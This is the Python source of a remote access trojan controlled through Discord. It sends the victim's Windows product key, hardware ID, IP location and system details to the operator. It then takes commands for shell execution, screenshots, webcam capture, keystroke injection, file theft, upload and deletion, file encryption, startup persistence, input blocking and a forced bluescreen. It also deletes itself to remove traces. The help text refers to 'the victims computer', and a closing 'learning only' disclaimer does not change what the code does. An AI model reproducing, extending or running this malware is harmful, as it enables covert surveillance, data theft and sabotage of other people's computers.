import os, platform, time, socket, subprocess, httpx, pyautogui, discord, ctypes, psutil, cv2
from discord.ext import commands
from cryptography.fernet import Fernet
from pynput.keyboard import Controller

print("Starting")

# TODO:
## Make .download on images an embed and replace [Requested] to [Path/to/image.jpg]
## Add the reaction process on: block input, turn off screen, panic, 

intents = discord.Intents.all()

#THINGS YOU NEED TO CHANGE
GUILDid = 1181772306742251592
OWNERid = 1001657888860819548
#THINGS YOU NEED TO CHANGE

client = commands.Bot(command_prefix=".", intents=intents)
print("Started bot")

@staticmethod
def system_info() -> list:
    flag = 0x08000000
    sh1 = "wmic csproduct get uuid"
    sh2 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"
    sh3 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName"
    try:
        HWID = subprocess.check_output(sh1, creationflags=flag).decode().split('\n')[1].strip()
    except Exception:
        HWID = "N/A"
    try:
        wkey = subprocess.check_output(sh2, creationflags=flag).decode().rstrip()
    except Exception:
        wkey = "N/A"
    try:
        winver = subprocess.check_output(sh3, creationflags=flag).decode().rstrip()
    except Exception:
        winver = "N/A"
    return [HWID, winver, wkey]

@staticmethod
def network_info() -> list:
    ip, hostname, city, country, region, postal, org, loc, timezone, googlemap = "None", "None", "None", "None", "None", "None", "None", "None", "None", "None"
    req = httpx.get("https://ipinfo.io/json")
    if req.status_code == 200:
        data = req.json()
        ip = data.get('ip')
        hostname = data.get('hostname')
        city = data.get('city')
        country = data.get('country')
        region = data.get('region')
        postal = data.get('postal')
        org = data.get('org')
        loc = data.get('loc')
        timezone = data.get('timezone')
        googlemap = "https://www.google.com/maps/search/google+map++" + loc
    return [ip, hostname, city, country, region, postal, org, loc, timezone, googlemap]


print("Grabbing info...")
sysInfoList = system_info()
netInfoList = network_info()
print("Snagged!")

#checking for admin
try:
    is_admin = os.getuid() == 0
except AttributeError:
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
print("Checked for admin: {0}".format(is_admin))
print("Starting main function")
@client.event
async def on_ready():
    global Cata
    global Main
    global Files
    global Info
    global Errors

    guild = client.get_guild(GUILDid)
    Cata = await guild.create_category(f"{os.getlogin()}:{netInfoList[0]}")

    Info = await guild.create_text_channel(name=f"info", category=Cata)
    Main = await guild.create_text_channel(name=f"main", category=Cata)
    Files = await guild.create_text_channel(name=f"files", category=Cata)
    Errors = await guild.create_text_channel(name=f"errors", category=Cata)

    await Info.send(f"""@.everyone New Log!```
<---------------Windows Info--------------->
HWID:             {sysInfoList[0]}
Windows Version:  {sysInfoList[1]}
Windows Key:      {sysInfoList[2]}
OS Name:          {platform.system()} {platform.architecture()[0]}
OS Version:       {platform.version()}
OS Platform:      {platform.platform()}
                    
<---------------IP Info--------------->
IP: {netInfoList[0]}

=========Info From IP=========
Hostname:           {netInfoList[1]}
City:               {netInfoList[2]}
Country:            {netInfoList[3]}
Region:             {netInfoList[4]}
ZipCode:            {netInfoList[5]}
Org:                {netInfoList[6]}
General Coords:     {netInfoList[7]}
Timezone:           {netInfoList[8]}
Google Map Link:    {netInfoList[9]}

<---------------Other Info--------------->
Name:                {os.getlogin()}
PC Name:             {socket.gethostname()}
Ran as Admin:        {is_admin}
CPU Name:            {platform.processor()}
CPU Count:           {os.cpu_count()}```""")

keyo = Fernet.generate_key()

@client.event
async def on_message(msg):
    try:
        if msg.author == client.user:
            return False
        
        global Cata
        global Info
        global Main
        global Files
        global Errors

        if msg.channel == Info:
            if msg.content == ".reinfo":
                await Info.send("``Please wait...``")
                sysInfoList = system_info()
                netInfoList = network_info()

                await Info.send(f"""```PC Info at {time.ctime()}```
```
<---------------Windows Info--------------->
HWID:             {sysInfoList[0]}
Windows Version:  {sysInfoList[1]}
Windows Key:      {sysInfoList[2]}
OS Name:          {platform.system()} {platform.architecture()[0]}
OS Version:       {platform.version()}
OS Platform:      {platform.platform()}
                    
<---------------IP Info--------------->
IP: {netInfoList[0]}

=========Info From IP=========
Hostname:           {netInfoList[1]}
City:               {netInfoList[2]}
Country:            {netInfoList[3]}
Region:             {netInfoList[4]}
ZipCode:            {netInfoList[5]}
Org:                {netInfoList[6]}
General Coords:     {netInfoList[7]}
Timezone:           {netInfoList[8]}
Google Map Link:    {netInfoList[9]}

<---------------Other Info--------------->
Name:                {os.getlogin()}
PC Name:             {socket.gethostname()}
Ran as Admin:        {is_admin}
CPU Name:            {platform.processor()}
CPU Count:           {os.cpu_count()}```""")
                
            if msg.content == ".net":
                netinfo_msg = await Info.send("```Which net info do you want to see?\n1️⃣ IP info\n2️⃣ Network Info\n3️⃣ Mac Addresses```")
                await netinfo_msg.add_reaction('1️⃣')
                await netinfo_msg.add_reaction('2️⃣')
                await netinfo_msg.add_reaction('3️⃣')

                def NetInfoCheck(reaction, user):
                    return True
                
                reaction, user = await client.wait_for('reaction_add', timeout=None, check=NetInfoCheck)

                if user == msg.author and str(reaction.emoji) == '1️⃣':
                    IPinfo = os.popen('arp -a').read()
                    smaller_string = ""
                    for line in IPinfo.splitlines():
                        if sum(len(i) for i in smaller_string) >= 1800:
                            await Info.send(f"```{smaller_string}```")
                            smaller_string = ""
                        smaller_string+=f"{line}\n"
                    await Info.send(f"```{smaller_string}```")

                elif user == msg.author and str(reaction.emoji) == '2️⃣':
                    NetInfo = os.popen('ipconfig /all').read()
                    smaller_string = ""
                    for line in NetInfo.splitlines():
                        if sum(len(i) for i in smaller_string) >= 1800:
                            await Info.send(f"```{smaller_string}```")
                            smaller_string = ""
                        smaller_string+=f"{line}\n"
                    await Info.send(f"```{smaller_string}```")

                elif user == msg.author and str(reaction.emoji) == '3️⃣':
                    MacInfo = os.popen('getmac').read()
                    smaller_string = ""
                    for line in MacInfo.splitlines():
                        if sum(len(i) for i in smaller_string) >= 1800:
                            await Info.send(f"```{smaller_string}```")
                            smaller_string = ""
                        smaller_string+=f"{line}\n"
                    await Info.send(f"```{smaller_string}```")
            
            if msg.content == ".usb":
                await Info.send("```Please wait...```")
                psPath = fr"{os.getenv('TEMP')}\USB_Setup.ps1"
                open(psPath, "w").write("Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' }")
                try:
                    USBinfo = os.popen(fr'Powershell -File "{psPath}"').read()
                    smaller_string = ""
                    for line in USBinfo.splitlines():
                        if sum(len(i) for i in smaller_string) >= 1800:
                            await Info.send(f"```{smaller_string}```")
                            smaller_string = ""
                        smaller_string+=f"{line}\n"
                    await Info.send(f"```{smaller_string}```")
                except:
                    await Errors.send(f"```[ERROR (.usb)] Possible problem: Powershell scripts are disabled```")



        #Files Channel
        if msg.channel == Files:
            if msg.content == ".ls":
                names = ""
                for filename in os.listdir(os.getcwd()):
                    names = f"{names}\n{filename}"
                await Files.send(f"```Contents of {os.getcwd()}```\n```{names}```")
            
            if msg.content == ".dir":
                await Files.send(f"```{os.getcwd()}```")

            if msg.content == ".startup":
                bat_path = fr"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
                os.system(fr'xcopy "{__file__}" "{bat_path}"')
                with open(fr"{bat_path}\startup.bat", "w+") as bat_file:
                    bat_file.write(r'start "" "%s"' % os.path.basename(__file__))
                await Files.send(fr"```File will now be ran on startup```")
            
            if msg.content.startswith(".cd"):
                path = msg.content[4:]
                try:
                    os.chdir(path)
                    await Files.send(f"```New dir: {os.getcwd()}```")
                except FileNotFoundError:
                    await Errors.send(f"```[ERROR (.cd)] Cannot find directory: {path}")
            
            if msg.content.startswith(".download"):
                filname = msg.content[10:]
                #size = os.path.getsize(f"{os.path.abspath(os.getcwd())}\{filname}") #worst possible way to do this, but it works so idk
                fle = discord.File(msg.content[10:], filename=msg.content[10:])
                await msg.channel.send(file=fle)
            
            if msg.content.startswith('.encrypt'):
                file = msg.content[9:]
                with open(f"{os.getenv('TEMP')}\systems.log", "wb") as thinekey:
                    thinekey.write(keyo)
                with open(file, "rb") as thefile:
                    content = thefile.read()
                encry = Fernet(keyo).encrypt(content)
                with open(file, "wb") as thefile:
                    thefile.write(encry)
                await Files.send(f"```Encrypted file {file} at {os.getcwd()}```")

            if msg.content.startswith('.decrypt'):  
                file = msg.content[9:]
                with open(f"{os.getenv('TEMP')}\systems.log", "rb") as key:
                    thekey = key.read()
                with open(file, "rb") as thefile:
                    crypcontetn = thefile.read()
                decry = Fernet(thekey).decrypt(crypcontetn)
                with open(file, "wb") as thefile:
                    thefile.write(decry)
                await Files.send(f"```Decrypted file {file} at {os.getcwd()}```")
            
            if msg.content.startswith('.upload'):
                try:
                    if str(msg.attachments) == "[]":
                        await Files.send("```No attachment found on message```")
                    else:
                        await msg.attachments[0].save(msg.content[8:])
                        await Files.send(f"```File {msg.content[8:]} uploaded to {os.getcwd()}```")
                except FileNotFoundError:
                    await Files.send("```Please give a name, ex: .upload Important.png```")
            
            if msg.content.startswith(".delete"):
                file = msg.content[8:]
                os.remove(file)
                await Files.send(f"```Deleted file {file} at {os.getcwd()}```")

            if msg.content.startswith('.read'):
                f = msg.content[6:]
                try:
                    with open(f, 'r') as fil:
                        contents = fil.read()
                    try:
                        await Files.send(f"```File {f} at {os.getcwd()} contains:```\n```{contents}```")
                    except discord.errors.HTTPException():
                        await Errors.send("```[ERROR (.read)] File too large to read... try using .download?```")
                except PermissionError:
                    await Errors.send(f"```[ERROR (.read)] Permission denied: {f}")
                except FileNotFoundError:
                    await Errors.send(f"```[ERROR (.read)] Cannot find file: {f}")

            if msg.content.startswith('.run'):
                file = msg.content[5:]
                os.startfile(file)
                await Files.send(f"```Ran file {file} at {os.getcwd()}```")

        if msg.channel == Main:
            if msg.content == ".ss":#MAKE EMBED
                await Main.send("```Taking Screenshot please wait...```")
                screenshot = pyautogui.screenshot()
                screenshot.save(f"{os.getenv('TEMP')}\SS.png")
                ssEmbed = discord.Embed(title=f"{time.ctime()} ``[Requested]``", color=0x00ff00)
                ssfile = discord.File(f"{os.getenv('TEMP')}\SS.png", filename="image.png")
                ssEmbed.set_image(url="attachment://image.png")
                await Main.send(file=ssfile, embed=ssEmbed)
                os.remove(f"{os.getenv('TEMP')}\SS.png")

            if msg.content.startswith(".msg"):
                mesg = msg.content[5:]
                ctypes.windll.user32.MessageBoxW(0, mesg, ';)', 0)
                await Main.send(f"```Sent message {mesg}```")
                    
            if msg.content.startswith(".getproc"):#I MADE THIS MYSELF, AND IT TOOK 3 HOURS
                allproc = ""
                procIter = 1
                for proc in psutil.process_iter():
                    try:
                        if sum(len(i) for i in allproc) >= 1500:
                            await Main.send(f'```All opened procceses at {time.ctime()}```\n{allproc.replace("~~~", "").replace("**x1**", "")}')
                            allproc = ""
                        processName = proc.name()
                        if processName in allproc:
                            for line in allproc.splitlines():
                                if processName == line.split("~~~")[1]:
                                    allproc = allproc.replace(line, f"{line.split('~~~ **x')[0]}~~~ **x{int(line.split('~~~ **x')[1].replace('**', ''))+1}**")
                                    break
                        else:
                            allproc += f"**{procIter})** ~~~{processName}~~~ **x1**\n"
                            procIter += 1

                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        pass
                await Main.send(f'```All opened procceses at {time.ctime()}```\n{allproc.replace("~~~", "").replace("**x1**", "")}')

            if msg.content.startswith('.kill'):
                proccess = msg.content[6:]
                os.system(f"taskkill /im {proccess}")
                await Main.send(f"```Killed process {proccess}```")
                    
            if msg.content.startswith(".cmd"):
                cmdand = msg.content[5:]
                cmdoutput = os.popen(cmdand).read()
                try:
                    await Main.send(f"```Output of command {cmdand}```\n```{cmdoutput}```")
                except:
                    await Main.send(f"```No output detected on command {cmdand}```")

            if msg.content.startswith(".type"):
                totype = msg.content[6:]
                keyboard = Controller()
                for letter in totype:
                    key=letter
                    keyboard.press(key)
                    keyboard.release(key)
                await Main.send(f"```Typed: {totype}```")

            if msg.content.startswith(".webcam"):
                await Main.send("```Snapping a picture...```")
                cap = cv2.VideoCapture(0)
                result, image = cap.read()
                if not cap.isOpened():
                    await Main.send("```No webcam found```")
                else:
                    try:
                        cv2.imwrite(f"{os.getenv('TEMP')}\Scematics.jpg", image)
                        cap.release()
                        await Main.send(file= discord.File(f"{os.getenv('TEMP')}\Scematics.jpg"))
                        os.remove(f"{os.getenv('TEMP')}\Scematics.jpg")
                    except:
                        await Errors.send("```[ERROR (.webcam)] Camera already in use (probably)```")
                                
            if msg.content.startswith('.background'):
                if str(msg.attachments) == "[]":
                    await Main.send("```No image attachment found```")
                else:
                    await msg.attachments[0].save(f"{os.getenv('TEMP')}\TEMP_65239845.jpg")
                    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{os.getenv('TEMP')}\TEMP_65239845.jpg" , 0)
                    os.remove(f"{os.getenv('TEMP')}\TEMP_65239845.jpg")

            if msg.content.startswith(".stop"):
                await Main.send("```Stopping process...```")
                await client.close()

            if msg.content.startswith(".panic"):
                await Main.send("```Deleting traces...```")
                os.remove(f"{os.path.dirname(os.path.abspath(__file__))}\{os.path.basename(__file__)}")
                await client.close()

            if msg.content.startswith(".access"):
                openPath = msg.content[6:]
                if openPath == "":
                    await Main.send(f"```Please give a folder to open access to")
                else:
                    os.chmod(openPath, 0o0700)
                    await Main.send(f"```Opened access to folder {openPath}")

            if msg.content == ".shutdown":
                shutdownmsg = await Main.send("```You are about to shut off the victims computer\nThis will stop the bot, I recommend you run .startup first\nPlease react with 💀 if you want to shut down the computer, otherwise react with 🔴 to stop```")
                await shutdownmsg.add_reaction('\U0001F480')
                await shutdownmsg.add_reaction('\U0001F534')

                def ShutDownCheck(reaction, user):
                    return True
                
                reaction, user = await client.wait_for('reaction_add', timeout=None, check=ShutDownCheck)
                if user == msg.author and str(reaction.emoji) == '💀':
                    await Main.send("```Shutting down...```")
                    os.system("shutdown /s /t 1")
                elif user == msg.author and str(reaction.emoji) == '🔴':
                    await Main.send("```Not Shutting down...```")


            if msg.content == ".bosd":
                BOSDnmsg = await Main.send("```You are about to BOSD the victims computer\nThis will stop the bot, I recommend you run .startup first\nPlease react with 💀 if you want to BOSD the computer, otherwise react with 🔴 to stop```")
                await BOSDnmsg.add_reaction('💀')
                await BOSDnmsg.add_reaction('🔴')

                def BOSDCheck(reaction, user):
                    return True
                
                reaction, user = await client.wait_for('reaction_add', timeout=None, check=BOSDCheck)
                if user == msg.author and str(reaction.emoji) == '💀':
                    await Main.send("```Sending bluescreen...```")
                    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
                    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
                elif user == msg.author and str(reaction.emoji) == '🔴':
                    await Main.send("```Not sending bluescreen...```")
            

            if msg.content.startswith(".display"):
                choice = msg.content[9:]
                if is_admin == False:
                    if choice == "off":
                        await Main.send("```Temporarily turned off screen```")
                        ctypes.windll.user32.SendMessageW(65535, 274, 61808, 2)
                    elif choice == "on":
                        await Main.send("```Turned screen on```")
                        ctypes.windll.user32.SendMessageW(65535, 274, 61808, -1)
                    else:
                        await Main.send("```Please use: .display on/off```")
                if is_admin == True:
                    if choice == "off":
                        ctypes.windll.user32.BlockInput(True)
                        ctypes.windll.user32.SendMessageW(65535, 274, 61808, 2)
                        await Main.send("```Permanently turned off screen```")
                    elif choice == "on":
                        ctypes.windll.user32.SendMessageW(65535, 274, 61808, -1)
                        await Main.send("```Turned screen on```")
                    else:
                        await Main.send("```Please use: .display on/off```")
                    
            if msg.content.startswith(".blockinput"):
                choice2 = msg.content[12:]
                if is_admin == True:
                    if choice2 == "off":
                        ctypes.windll.user32.BlockInput(False)
                        await Main.send("```Input has been unblocked```")
                    elif choice2 == "on":
                        ctypes.windll.user32.BlockInput(True)
                        await Main.send("```Input has been blocked```")
                    else:
                        await Main.send("```Please use: .blockinput on/off```")
                else:
                    await Main.send("```Requires admin```")

        if msg.channel.category == Cata:
            if msg.content.startswith(".help"):
                await msg.channel.send(helpmsg)
            
            if msg.author.id == OWNERid:
                #Owner Commands
                if msg.content == ".superPanic":
                    #os.remove(f"{os.path.dirname(os.path.abspath(__file__))}\{os.path.basename(__file__)}")
                    await Main.delete()
                    await Files.delete()
                    await Info.delete()
                    await Errors.delete()
                    await Cata.delete()

                    await client.close()
                
    except Exception as er:
        await Errors.send(f"[Error (general)] Uncatagorized error: {str(er)}")



helpmsg = fr"""
## **Main**
```
.panic        : Quits the bot process and deletes the file
.stop         : Quits the bot process
.ss           : Takes a screenshot of the primary screen
.webcam       : Takes a photo of the primary webcam
.getproc      : Shows the names of all processes running
.type         : Sends keyboard inputs
.msg          : Shows a popup message box
.kill         : Kills a process by name (ex: .kill Fortnite.exe)
.startup      : Auto runs file when computer is turned on
.background   : Sets the background to specified image
.cmd          : Sends a custom CMD command and returns the output. Warning: Only executes next commands when previous command is done
.shutdown     : Shuts off computer
.bosd         : Sends the bluescreen signal
.blockinput   : Stops all input (requires admin)
.access       : Allows access to a folder if your getting a permission denied error

for cryptors: Creates a key located at : C:\Users\Collin\AppData\Local\Temp\systems.log
If you encrypted a file, I strongly recommend downloading the key incase you need to decrypt it later
.encrypt    : Encrypts a file with a key for the current session
.decrypt    : Decrypts a file with a key for the current session
```
## **Files**
```
.dir          : Shows the current directory the bot is in
.cd           : Changes the current directory the bot is in
.ls           : Shows all files and folders in current directory
.read         : Displays the contents of a given file
.download     : Downloads and send a given file
.upload       : Uploads a given file to the current dir
.delete       : Deletes a given file
```
## **Info**
```
.reinfo : Gets all info again, only use this if some info if broken
```
## **Owner Commands*
```
.superPanic : Removes all of the channels, deletes the file, stops the bot
```
More CPU info: https://browser.geekbench.com/v5/cpu/search

Remember that this is only used for learning and testing vulnerabilities and to **never** use this on any system you dont have permission to!
"""

#THIS IS 2000 CHARACTERS EXACTLY, SEND ANOTHER MSG IF YOU ADD MORE

print("Running bot...")
tokn='' # you thought lol
client.run(tokn)